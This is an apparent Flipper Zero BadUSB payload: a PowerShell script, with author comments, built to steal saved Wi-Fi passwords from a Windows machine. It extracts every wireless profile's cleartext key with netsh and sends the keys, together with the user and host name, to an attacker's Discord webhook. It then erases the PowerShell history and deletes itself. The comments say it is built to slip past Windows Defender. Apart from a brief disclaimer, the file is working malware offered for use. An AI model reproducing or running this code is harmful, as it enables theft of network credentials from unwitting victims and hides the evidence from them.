# FlipperZero

############################################################################################
###########      Place your webhook in the "Your-Discord-Webhook-Here" field      ##########
############################################################################################

#      Below is the final copy of the script before the BadUSB attack executes the payload.
#      The issue i found with other WiFi stealing BadUSB attacks was that the payload is hosted 
#      online and the HID simply attempted to download/run the script. Every single time I attempted
#      one of these attacks, defender would step in and catch it before it executed.
#
#      My script does NOT host anything online. The script is yours to edit and audit. 
#      The idea behind the script is that the HID uses the run dialogue box to create an empty .ps1
#      file in the C:\Users\Public\ directory and appends each line of my code to that file.
#      The file line of the BadUSB attack executes the script, which sends your discord webhook
#      a message, and then the payload deletes the file it created.
#
#
#
#      THIS SCRIPT IS FOR EDUCATIONAL PURPOSES ONLY AND I AM NOT RESPONSIBLE FOR MISTAKES YOU MAKE
#
#
#

$d="Your-Discord-Webhook-Here"
$s="$env:USERNAME@$env:COMPUTERNAME"
$o=@()
(netsh wlan show profiles) | ? { $_ -match ":\s(.+)$" } | % {
    $n = ($_ -split ":")[-1].Trim()
    $p = (netsh wlan show profile name="$n" key=clear | sls "Key Content").Line
    if ($p) { $p = ($p -split ":")[-1].Trim() } else { $p = "<NO_PASSWORD>" }
    $o += "$n : $p"
}
$w = $o -join "`n"
if ($w) { irm $d -Method Post -Body (@{username=$s; content="**Wi-Fi Passwords**`n`n$w"} | ConvertTo-Json) -ContentType "application/json" | Out-Null } else {
    irm $d -Method Post -Body (@{username=$s; content="**Error**: Check 'netsh wlan show profiles' manually."} | ConvertTo-Json) -ContentType "application/json" | Out-Null
}
del (Get-PSReadlineOption).HistorySavePath -ea 0
Remove-Item -Path $MyInvocation.MyCommand.Path -Force
Start-Sleep 2
[System.GC]::Collect()
